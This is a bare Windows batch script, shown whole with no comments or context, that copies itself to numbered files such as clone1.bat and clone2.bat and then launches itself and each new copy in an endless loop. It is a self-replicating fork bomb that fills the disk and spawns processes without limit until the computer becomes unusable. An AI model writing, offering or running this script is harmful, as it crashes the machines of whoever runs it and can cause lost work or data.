@echo off
set name=%0
set clone=1
:start
:clone
if not exist clone%clone%.bat (
copy "%name%" "clone%clone%.bat"
) else (
set /a clone=%clone%+1
GoTo clone
)
start %name%
start clone%clone%.bat
GoTo start